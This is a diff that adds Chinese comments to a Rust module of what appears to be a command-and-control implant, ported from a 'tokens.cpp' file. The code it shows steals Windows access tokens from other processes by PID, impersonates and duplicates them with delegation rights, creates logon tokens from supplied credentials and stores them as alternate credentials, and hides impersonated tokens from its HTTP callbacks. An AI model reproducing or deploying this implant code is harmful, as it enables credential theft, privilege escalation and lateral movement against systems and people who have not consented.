@@ -1,3 +1,4 @@
+//! 令牌窃取（tokens.cpp）。
 //! Token stealing (tokens.cpp).
 
 use crate::callback::{post_error_d, post_error_dd, post_error_na, Callback};
@@ -24,6 +25,7 @@ use windows_sys::Win32::System::Threading::{
 use parking_lot::Mutex;
 use std::sync::OnceLock;
 
+/// 备用凭据数据结构。
 /// Alternate credentials data structure.
 #[derive(Default)]
 pub struct AltCreds {
@@ -43,6 +45,7 @@ pub fn acreds() -> parking_lot::MutexGuard<'static, AltCreds> {
     acreds_lock().lock()
 }
 
+/// 确保我们不会使用模拟令牌发起 HTTP 请求。
 /// Make sure we do not make HTTP requests with impersonated tokens.
 pub fn token_guard_start() {
     if state::atoken() != 0 {
@@ -58,6 +61,7 @@ pub fn token_guard_start_maybe(ignore_token: bool) {
     }
 }
 
+/// 如果存在模拟令牌，则切换回该令牌。
 /// Go back to our impersonated token if there is one.
 pub fn token_guard_stop() {
     if state::atoken() != 0 {
@@ -73,8 +77,10 @@ pub fn token_guard_stop_maybe(ignore_token: bool) {
     }
 }
 
+/// 丢弃模拟令牌（rev2self）。
 /// Drop the impersonated token.
 pub fn command_rev2self() {
+    // 同时将存储的令牌置为 NULL
     // make the stored token NULL as well
     if state::atoken() != 0 {
         unsafe {
@@ -86,6 +92,7 @@ pub fn command_rev2self() {
         RevertToSelf();
     }
 
+    // 同时清空我们的备用凭据
     // nuke our alternate creds too
     let mut c = acreds();
     c.domain.clear();
@@ -94,6 +101,7 @@ pub fn command_rev2self() {
     c.active = false;
 }
 
+/// 用令牌的 USER\域名形式填充缓冲区。
 /// Populate buffer with the USER\whatever of the token.
 pub fn token_user(token: isize, buffer: &mut [u8]) -> bool {
     let mut username_only = [0u8; 512];
@@ -118,6 +126,7 @@ pub fn token_user(token: isize, buffer: &mut [u8]) -> bool {
             return false;
         }
 
+        // TOKEN_USER 位于缓冲区开头；SID 是指向内部的指针
         // TOKEN_USER is at the front of the buffer; SID is a pointer inside it
         let sid = (token_user_info.as_ptr() as *const TOKEN_USER).read().User.Sid;
         if LookupAccountSidA(
@@ -161,6 +170,7 @@ fn token_output(token: isize, callback: Callback) {
     }
 }
 
+/// 获取用户的 UID。
 /// Get UID of a user.
 pub fn command_getuid(_buffer: &[u8], _length: usize, callback: Callback) {
     let mut token: HANDLE = std::ptr::null_mut();
@@ -181,12 +191,14 @@ pub fn command_getuid(_buffer: &[u8], _length: usize, callback: Callback) {
     }
 }
 
+/// 窃取一个令牌。
 /// Steal a token.
 pub fn command_steal_token(buffer: &[u8], length: usize, callback: Callback) {
     let mut token: HANDLE = std::ptr::null_mut();
     let mut handle: HANDLE = std::ptr::null_mut();
     let mut name = [0u8; 512];
 
+    // 从缓冲区中提取 pid
     // extract pid from buffer
     if length != 4 {
         return;
@@ -194,6 +206,7 @@ pub fn command_steal_token(buffer: &[u8], length: usize, callback: Callback) {
     let pid = u32::from_be_bytes([buffer[0], buffer[1], buffer[2], buffer[3]]);
 
     unsafe {
+        // 获取目标进程的句柄
         // obtain a handle to the process we want
         handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
         if handle.is_null() {
@@ -201,21 +214,25 @@ pub fn command_steal_token(buffer: &[u8], length: usize, callback: Callback) {
             return;
         }
 
+        // 尝试获取该进程的令牌
         // try to grab that process's token
         if OpenProcessToken(handle, TOKEN_ALL_ACCESS, &mut token) == 0 {
             post_error_dd(0x24, pid as i32, GetLastError() as i32);
             return;
         }
 
+        // 丢弃我们旧的令牌
         // drop our old token
         command_rev2self();
 
+        // 尝试窃取令牌
         // try to steal the token
         if ImpersonateLoggedOnUser(token) == 0 {
             post_error_dd(0x25, pid as i32, GetLastError() as i32);
             return;
         }
 
+        // 将令牌复制到 atoken
         // duplicate the token into atoken
         let mut atoken: HANDLE = std::ptr::null_mut();
         if DuplicateTokenEx(token, MAXIMUM_ALLOWED, std::ptr::null(), SecurityDelegation, TokenPrimary, &mut atoken) == 0 {
@@ -224,6 +241,7 @@ pub fn command_steal_token(buffer: &[u8], length: usize, callback: Callback) {
         }
         state::set_atoken(atoken as isize);
 
+        // 使用复制的令牌再次模拟
         // impersonate again with the duplicated token
         if ImpersonateLoggedOnUser(atoken) == 0 {
             post_error_dd(0x27, pid as i32, GetLastError() as i32);
@@ -244,8 +262,10 @@ pub fn command_steal_token(buffer: &[u8], length: usize, callback: Callback) {
     }
 }
 
+/// 使用凭据创建令牌。
 /// Create a token with credentials.
 pub fn logintoken(domain: &[u8], user: &[u8], pass: &[u8], callback: Callback) {
+    // 丢弃当前令牌并清理
     // drop the current token and clean it up
     command_rev2self();
 
@@ -275,6 +295,7 @@ pub fn logintoken(domain: &[u8], user: &[u8], pass: &[u8], callback: Callback) {
         }
     }
 
+    // 分配我们的备用凭据
     // allocate our alternate credentials
     let mut c = acreds();
     c.domain = decode_utf16(domain);
@@ -282,6 +303,7 @@ pub fn logintoken(domain: &[u8], user: &[u8], pass: &[u8], callback: Callback) {
     c.password = decode_utf16(pass);
     c.active = true;
 
+    // 通知用户
     // let the user know
     let mut name = [0u8; 1024];
     if token_user(state::atoken(), &mut name) {
@@ -290,6 +312,7 @@ pub fn logintoken(domain: &[u8], user: &[u8], pass: &[u8], callback: Callback) {
     }
 }
 
+/// 使用凭据创建令牌……多谢。
 /// Create a token with credentials... k thx.
 pub fn command_loginuser(buffer: &[u8], length: usize, callback: Callback) {
     let mut blob = data_alloc(1024 * 3);
@@ -314,6 +337,7 @@ pub fn command_loginuser(buffer: &[u8], length: usize, callback: Callback) {
     blob.cleanup();
 }
 
+/// 检查当前用户是否为管理员。
 /// Check if the current user is an administrator or not.
 pub fn is_admin() -> bool {
     unsafe {
@@ -347,16 +371,20 @@ pub fn is_admin() -> bool {
     }
 }
 
+/// 使用一个令牌。
 /// Use a token.
 pub fn use_token(token: isize, name: &mut [u8], nlen: usize) -> bool {
+    // 丢弃我们旧的令牌
     // drop our old token
     command_rev2self();
 
     unsafe {
+        // 尝试窃取令牌
         // try to steal the token
         if ImpersonateLoggedOnUser(token as HANDLE) == 0 {
             return false;
         }
+        // 将令牌复制到 atoken
         // duplicate the token into atoken
         let mut atoken: HANDLE = std::ptr::null_mut();
         if DuplicateTokenEx(token as HANDLE, MAXIMUM_ALLOWED, std::ptr::null(), SecurityDelegation, TokenPrimary, &mut atoken) == 0 {
